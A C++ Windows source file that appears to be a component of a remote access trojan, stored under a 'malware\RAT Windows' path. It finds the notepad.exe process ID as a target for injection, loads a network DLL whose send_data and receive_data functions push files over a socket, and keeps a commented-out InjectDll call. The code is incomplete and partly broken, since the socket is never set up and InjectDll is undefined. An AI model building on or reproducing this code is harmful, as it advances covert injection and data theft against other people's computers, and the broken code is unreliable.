#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <tlhelp32.h>
#include <tchar.h>

using namespace std;

SOCKET sock;
// Define the function pointer type
typedef void (*SendDataFunc)(SOCKET&, const std::string&, const std::string&);
// Define the function pointer type
typedef string (*RecvDataFunc)(SOCKET&, const std::string&, const std::string&);
typedef void (*sayHiFunc)(const std::string&);

// Get the DLL file name from the command-line argument
//LPSTR dll_file = argv[1];
//LPCSTR dll_file = "test_lib.dll";                                                      //!!!!!!!!!!!!!!!NOte the datatype!!!!!!!!!!!!!!!!!!!
LPCSTR dllPath = "C:\\malware\\RAT Windows\\test\\func\\dll\\network_lib.dll";
DWORD pid;


BOOL ListRunningProcesses()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    const wchar_t* targetProcessName = L"notepad.exe";

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {   
        std::cerr << "Failed to create process snapshot: " << GetLastError() << std::endl;
        return false;
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof( PROCESSENTRY32W );

    if( !Process32FirstW( hProcessSnap, &pe32 ) )
    {
        std::cerr << "Error getting the process info "; // show cause of failure
        CloseHandle( hProcessSnap );          // clean the snapshot object
        return( FALSE );
    }

    bool found = false;
    do
    {

        if (wcscmp(pe32.szExeFile, targetProcessName) == 0)
        {
            found = true;
            std::cout << "\n=====================================================\n";
            std::wcout << L"PROCESS NAME: " << pe32.szExeFile << std::endl;
            std::cout << "-----------------------------------------------------" << std::endl;
            std::cout << "  Process ID        = " << pe32.th32ProcessID << std::endl;
            std::cout << "  Thread count      = " << pe32.cntThreads << std::endl;
            std::cout << "  Parent process ID = " << pe32.th32ParentProcessID << std::endl;
            std::cout << "  Priority base     = " << pe32.pcPriClassBase << std::endl;
            pid = pe32.th32ProcessID;
            break; // Exit loop as the process is found
        }
    } while (Process32NextW(hProcessSnap, &pe32));

    if (!found) {
        std::wcout << L"Process not found: " << targetProcessName << std::endl;
    }

    CloseHandle( hProcessSnap );
    return( TRUE );    

}

void load_dll()
{
    HINSTANCE hDLL = LoadLibraryA(dllPath);
    if (hDLL == NULL)
    {
        printf("Failed to load DLL: %d\n", GetLastError());
        //return EXIT_FAILURE;
    }
    printf("\n\nDLL loaded successfully!\n\n");

    // Get the address of the exported function
    SendDataFunc send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAXAEA_KV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@1@Z");
    if (!send_data)
    {
        printf("Failed to get function address: %d\n", GetLastError());
        FreeLibrary(hDLL);
        return;
    }
    printf("Function 'send_data' retrieved successfully!\n");

    // Get the address of the exported function
    RecvDataFunc receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEA_KAEBV12@@Z");
    if (!receive_data)
    {
        printf("Failed to get function address: %d\n", GetLastError());
        FreeLibrary(hDLL);
        return;
    }
    printf("Function 'receive_data' retrieved successfully!\n"); 

    
    // sayHiFunc sayhi = (sayHiFunc)GetProcAddress(hDLL, "?sayhi@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    // if (!sayhi)
    // {
    //     printf("Failed to get function address: %d\n", GetLastError());
    //     FreeLibrary(hDLL);
    //     return;
    // }
    // printf("Function 'sayhi' retrieved successfully!\n");

    // string test;
    // cin >> test;
    // sayhi(test);

    send_data(sock,"12345678910.txt","data");
    FreeLibrary(hDLL);
}

int main(int argc, char* argv[])
{

    load_dll();

    
    //ListRunningProcesses();
    //InjectDll(pid, dllPath);
    return EXIT_SUCCESS;
}
